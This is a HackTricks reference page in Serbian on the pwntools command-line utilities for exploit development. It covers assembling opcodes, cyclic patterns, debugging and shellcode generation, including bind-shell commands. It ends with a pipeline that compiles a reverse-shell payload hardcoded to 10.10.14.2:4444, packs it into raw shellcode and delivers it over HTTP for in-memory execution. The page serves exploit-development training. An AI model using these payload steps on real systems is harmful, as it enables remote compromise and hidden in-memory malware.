# PwnTools

{{#include ../../../banners/hacktricks-training.md}}
```
pip3 install pwntools
```
## Pwn asm

Dobijte **opcodes** iz linije ili fajla.
```
pwn asm "jmp esp"
pwn asm -i <filepath>
```
**Moguće je izabrati:**

- tip izlaza (raw,hex,string,elf)
- kontekst izlazne datoteke (16,32,64,linux,windows...)
- izbegavati bajtove (prelomi reda, null, lista)
- izaberite encoder, debug-ujte shellcode koristeći gdb, pokrenite izlaz

## **Pwn checksec**

Checksec skripta
```
pwn checksec <executable>
```
## Pwn constgrep

## Pwn cyclic

Dobijte obrazac
```
pwn cyclic 3000
pwn cyclic -l faad
```
**Može se izabrati:**

- Korišćeni alfabet (po podrazumevanju: mala slova)
- Dužina jedinstvenog patterna (podrazumevano 4)
- kontekst (16,32,64,linux,windows...)
- Uzmi offset (-l)

## Pwn debug

Prikači GDB na proces
```
pwn debug --exec /bin/bash
pwn debug --pid 1234
pwn debug --process bash
```
**Moguće izabrati:**

- Po executable, po name ili po pid context (16,32,64,linux,windows...)
- gdbscript za izvršavanje
- sysrootpath

## Pwn disablenx

Onemogućite nx za binary
```
pwn disablenx <filepath>
```
## Pwn disasm

Disasembluj hex opcodes
```
pwn disasm ffe4
```
**Može se odabrati:**

- context (16,32,64,linux,windows...)
- base addres
- color(default)/no color

## Pwn elfdiff

Prikazuje razlike između 2 fajla
```
pwn elfdiff <file1> <file2>
```
## Pwn hex

Dobijte heksadecimalnu reprezentaciju
```bash
pwn hex hola #Get hex of "hola" ascii
```
## Pwn phd

Dobij hexdump
```
pwn phd <file>
```
**Može se izabrati:**

- Broj bajtova za prikaz
- Broj bajtova po liniji; istaknuti bajt
- Preskočiti bajtove na početku

## Pwn pwnstrip

## Pwn scrable

## Pwn shellcraft

Nabavite shellcodes
```
pwn shellcraft -l #List shellcodes
pwn shellcraft -l amd #Shellcode with amd in the name
pwn shellcraft -f hex amd64.linux.sh #Create in C and run
pwn shellcraft -r amd64.linux.sh #Run to test. Get shell
pwn shellcraft .r amd64.linux.bindsh 9095 #Bind SH to port
```
**Možete odabrati:**

- shellcode i argumenti za shellcode
- izlazna datoteka
- format izlaza
- debug (prikači dbg na shellcode)
- pre (debug trap before code)
- posle
- izbegavati korišćenje opcodes (default: not null and new line)
- Pokreni shellcode
- Boja / bez boje
- lista syscalls
- lista mogućih shellcodes
- Generiši ELF kao shared library

## Pwn template

Preuzmi python šablon
```
pwn template
```
**Moguće je izabrati:** host, port, user, pass, path and quiet

## Pwn unhex

Od hex do string
```
pwn unhex 686f6c61
```
## Pwn update

Da biste ažurirali pwntools
```
pwn update
```
## ELF → pakovanje raw shellcode-a (loader_append)

Pwntools može pretvoriti samostalni ELF u jedinstveni raw shellcode blob koji sam mapira svoje segmente i prebaci izvršavanje na originalni entrypoint. Ovo je idealno za memory-only loadere (npr. Android aplikacije koje pozivaju JNI da izvrše preuzete bajtove).

Tipični pipeline (amd64 primer)

1) Izgradite statički, position‑independent payload ELF (musl preporučen zbog prenosivosti):
```bash
musl-gcc -O3 -s -static -o exploit exploit.c \
-DREV_SHELL_IP="\"10.10.14.2\"" -DREV_SHELL_PORT="\"4444\""
```
2) Pretvori ELF → shellcode pomoću pwntools:
```python
# exp2sc.py
from pwn import *
context.clear(arch='amd64')
elf = ELF('./exploit')
sc = asm(shellcraft.loader_append(elf.data, arch='amd64'))
open('sc','wb').write(sc)
print(f"ELF size={len(elf.data)} bytes, shellcode size={len(sc)} bytes")
```
3) Dostavite sc loaderu u memoriji (npr. preko HTTP[S]) i izvršite unutar procesa.

Napomene
- loader_append ugrađuje originalni ELF program u shellcode i emituje mali loader that mmaps the segments and jumps to the entry.
- Budite eksplicitni u vezi arhitekture preko context.clear(arch=...). arm64 je čest na Androidu.
- Obezbedite da kod vašeg payload‑a bude position‑independent i izbegavajte pretpostavke o procesu ASLR/NX.

## References

- [Pwntools](https://docs.pwntools.com/en/stable/)
- [CoRPhone – ELF→shellcode pipeline used for Android in-memory execution](https://github.com/0xdevil/corphone)

{{#include ../../../banners/hacktricks-training.md}}
